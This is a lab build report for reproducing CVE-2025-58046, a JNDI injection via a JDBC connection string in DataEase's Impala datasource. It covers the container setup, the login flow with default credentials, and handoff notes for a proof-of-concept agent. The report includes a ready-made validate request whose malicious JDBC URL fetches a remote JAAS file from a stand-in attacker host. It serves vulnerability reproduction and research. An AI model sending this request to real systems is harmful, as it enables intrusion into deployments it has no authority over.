# Lab Build Report: CVE-2025-58046

## Lab Architecture

The lab reproduces **CVE-2025-58046** — a JNDI injection via unsanitized JDBC connection string in DataEase v2.10.12's Impala datasource type. The lab uses official pre-built Docker images from the Aliyun registry (the vendor's own distribution channel).

### Containers

| Container | Role | Image | Status |
|-----------|------|-------|--------|
| `cve-2025-58046-mysql` | MySQL 8.4 database (DataEase metadata store) | `registry.cn-qingdao.aliyuncs.com/dataease/mysql:8.4.5` | ✅ Healthy |
| `cve-2025-58046-dataease` | DataEase v2.10.12 (vulnerable target) | `registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.12` | ✅ Healthy |

### Network

- All containers are on the `lab_cve-2025-58046-net` bridge network
- MySQL is accessible to DataEase via hostname `mysql-de`
- DataEase port 8100 is mapped to host port 18100
- **From the attacker machine**: Use container IP directly (see "Accessing the Lab" below)

---

## Container Details

### MySQL (`cve-2025-58046-mysql`)
- **Image**: `registry.cn-qingdao.aliyuncs.com/dataease/mysql:8.4.5`
- **Container IP**: `172.25.0.2`
- **Root password**: `Password123@mysql`
- **Database**: `dataease`
- **Healthcheck**: `mysqladmin ping`

### DataEase (`cve-2025-58046-dataease`)
- **Image**: `registry.cn-qingdao.aliyuncs.com/dataease/dataease:v2.10.12`
- **Container IP**: `172.25.0.3`
- **Port**: 8100 (HTTP)
- **Host port mapping**: 18100→8100
- **Healthcheck**: `nc -zv 127.0.0.1 8100`
- **Java version**: OpenJDK 21
- **Spring Boot version**: 3.3.0

---

## Build Status

| Component | Status | Notes |
|-----------|--------|-------|
| MySQL image build | ✅ Success | Custom image with my.cnf and init.sql baked in |
| DataEase image build | ✅ Success | Custom image with application.yml baked in |
| MySQL startup | ✅ Healthy | Flyway migrations completed successfully |
| DataEase startup | ✅ Healthy | Started in ~8 seconds, all controllers registered |
| API endpoint test | ✅ Working | `/de2api/dekey`, `/de2api/login/localLogin`, `/de2api/datasource/validate` all functional |
| Authentication flow | ✅ Working | RSA-encrypted login with default creds returns valid JWT |
| Vulnerable endpoint | ✅ Accessible | Datasource validate processes JDBC URLs (returns Impala connection error as expected) |

### Workarounds Applied

1. **No bind mounts**: All config files are COPY'd into custom Docker images (Dockerfile.mysql, Dockerfile.vulnerable) instead of using volume mounts.

2. **Minimal application.yml**: Only the `spring.datasource` URL/credentials are overridden. The embedded `application-standalone.yml` profile handles all other settings. Including a `server.servlet.context-path` override caused all controllers to return 404 due to whitelist URI stripping in `WhitelistUtils.match()`.

---

## API Endpoint Details

**CRITICAL DISCOVERY**: All API endpoints in DataEase are prefixed with `/de2api/` via Spring's `PathMatchConfigurer.addPathPrefix()` in `CorsConfig.java`. This applies to all `@RestController` classes in the `io.dataease` package.

### Key Endpoints

| Endpoint | Method | Auth Required | Purpose |
|----------|--------|---------------|---------|
| `/de2api/dekey` | GET | No (whitelisted) | Get RSA public key for credential encryption |
| `/de2api/symmetricKey` | GET | No (whitelisted) | Get symmetric key |
| `/de2api/login/localLogin` | POST | No (whitelisted) | Login with RSA-encrypted credentials |
| `/de2api/datasource/validate` | POST | Yes (JWT via `X-DE-TOKEN` header) | **VULNERABLE** — validates datasource connection |
| `/de2api/datasource/save` | POST | Yes | Create datasource |
| `/de2api/datasource/update` | POST | Yes | Update datasource |
| `/de2api/datasource/getSchema` | POST | Yes | Get schema |

### Authentication Flow

1. `GET /de2api/dekey` → returns `{ data: AES_encrypted(RSA_pubkey) + base64url("-pk_separator-") + AES_key }`
2. Parse response: split on `base64url("-pk_separator-")` to get AES-encrypted RSA key and AES key
3. Decrypt RSA public key: `AES-CBC(IV="0000000000000000", key=aes_key)` → RSA public key in raw base64
4. Wrap in PEM format: `-----BEGIN PUBLIC KEY-----\n{raw_base64}\n-----END PUBLIC KEY-----`
5. Encrypt credentials: `RSA_PKCS1v15_encrypt(username)`, `RSA_PKCS1v15_encrypt(password)`
6. `POST /de2api/login/localLogin` with `{"name": base64(encrypted_admin), "pwd": base64(encrypted_password)}`
7. Response: `{ data: { token: "eyJ..." } }`
8. Use token: `X-DE-TOKEN: <JWT>` header on all subsequent requests

### Default Credentials
- **Username**: `admin`
- **Password**: `DataEase@123456`

### Token Header
- **Header name**: `X-DE-TOKEN` (NOT `Authorization: Bearer`)
- **Defined in**: `AuthConstant.TOKEN_KEY = "X-DE-TOKEN"`

---

## Start/Stop Commands

### Start Lab
```bash
cd CVE-2025-58046
docker compose up -d
```

### Stop Lab
```bash
cd CVE-2025-58046
docker compose down
```

### Full Reset (with volume cleanup)
```bash
cd CVE-2025-58046
docker compose down -v
docker compose build --no-cache
docker compose up -d
```

### Rebuild Single Service
```bash
cd CVE-2025-58046
docker compose build --no-cache dataease
docker compose up -d --force-recreate dataease
```

---

## Accessing the Lab

### From Attacker Container
```bash
# Get DataEase container IP
DATAEASE_IP=$(docker inspect cve-2025-58046-dataease --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')

# Test API
curl -s "http://${DATAEASE_IP}:8100/de2api/dekey" | jq .

# Or use docker exec
docker exec cve-2025-58046-dataease wget -q -O- http://localhost:8100/de2api/dekey
```

### From Host Machine
```bash
curl http://localhost:18100/de2api/dekey
```

---

## Verification Evidence

### 1. Containers Running and Healthy
```
cve-2025-58046-dataease   lab-dataease   Up (healthy)   0.0.0.0:18100->8100/tcp
cve-2025-58046-mysql      lab-mysql-de   Up (healthy)   3306/tcp, 33060/tcp
```

### 2. RSA Key Endpoint Working
```
GET /de2api/dekey → HTTP 200, returns RSA public key (572 chars)
```

### 3. Login Successful with Default Credentials
```
POST /de2api/login/localLogin → HTTP 200, JWT token returned
Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
```

### 4. Vulnerable Endpoint Processes Requests
```
POST /de2api/datasource/validate (with X-DE-TOKEN header)
→ code=40001, msg="[Cloudera][ImpalaJDBCDriver](500164) Error initialized or created transport"
```
This confirms the JDBC connection is being attempted with the attacker-supplied URL — the core vulnerability mechanism is operational.

---

## Lab Files

| File | Purpose |
|------|---------|
| `docker-compose.yml` | Orchestrates MySQL and DataEase containers |
| `Dockerfile.mysql` | Builds MySQL image with custom my.cnf and init.sql |
| `Dockerfile.vulnerable` | Builds DataEase image with custom application.yml |
| `conf/application.yml` | Minimal Spring Boot config (datasource URL override only) |
| `conf/my.cnf` | MySQL configuration (utf8, connection limits) |
| `init.sql` | Creates `dataease` database if not exists |

---

## Known Issues

1. **Port mapping not accessible from other containers**: Port mapping `18100:8100` exposes to the Docker host. Use container IP directly or `docker exec` from other containers.

2. **Impala JDBC driver is bundled**: The DataEase image includes the Cloudera Impala JDBC driver at `/opt/dataease2.0/drivers/`, which is loaded at runtime. This driver is what processes the `krbJAASFile` parameter in the malicious JDBC URL.

3. **No Impala server needed**: The vulnerability triggers when DataEase attempts to CONNECT to the Impala server using the malicious JDBC URL. The `krbJAASFile` parameter causes the driver to fetch a remote JAAS config file BEFORE the actual connection, so no real Impala server is required for exploitation.

4. **First startup is slower**: The first MySQL start runs Flyway migrations to create all DataEase tables. Subsequent starts are faster since the data is persisted in the Docker volume.

---

## Notes for PoC Agent

### Critical API Details
- **API prefix**: All endpoints require `/de2api/` prefix
- **Token header**: Use `X-DE-TOKEN` (NOT `Authorization: Bearer`)
- **RSA encryption**: Credentials must be RSA-encrypted with the key from `/de2api/dekey`
- **AES decryption of RSA key**: AES-CBC, IV=`"0000000000000000"`, key=16-char alphanumeric string from dekey response
- **PK separator**: `base64url("-pk_separator-")` = `LXBrX3NlcGFyYXRvci0=`

### Datasource Validate Request Format
```json
POST /de2api/datasource/validate
X-DE-TOKEN: <jwt_token>
Content-Type: application/json

{
  "name": "test-impala",
  "type": "impala",
  "configuration": "<base64_encoded_config>"
}
```

Where configuration (before base64 encoding):
```json
{
  "urlType": "jdbcUrl",
  "jdbcUrl": "jdbc:impala://127.0.0.1:21050/default;AuthMech=1;KrbRealm=EXAMPLE.COM;KrbHostFQDN=impala.example.com;KrbServiceName=impala;krbJAASFile=http://ATTACKER_IP:PORT/evil_jaas.conf"
}
```

### Python Dependencies for PoC
```
pycryptodome  # For RSA encryption (PKCS1_v1_5) and AES decryption (CBC mode)
```
